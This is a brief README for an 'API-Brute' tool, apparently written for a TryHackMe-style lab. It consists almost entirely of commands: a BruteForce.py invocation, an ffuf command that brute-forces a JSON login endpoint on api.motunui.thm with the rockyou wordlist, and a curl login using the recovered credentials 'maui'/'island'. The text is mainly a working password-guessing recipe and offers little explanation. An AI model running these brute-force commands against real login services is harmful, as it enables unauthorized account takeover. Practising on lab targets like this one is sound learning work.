# API-Brute
Attack the developers
1. `./BruteForce.py --url 10.10.x.x --wordlist <file> --data "user=admin, password=FUZZ" --code 200`

> or use fuff
```
ffuf -w /opt/rockyou.txt -u http://api.motunui.thm:3000/v2/login -X POST -H "Content-Type: application/json" -d '{"username": "maui", "password": "FUZZ"}' -fr "error" -fc 401 -c -v
```
>then content with curl
```
curl -d '{"username":"maui","password":"island"}' -H 'Content-Type: application/json' http://api.motunui.thm:3000/v2/login
```
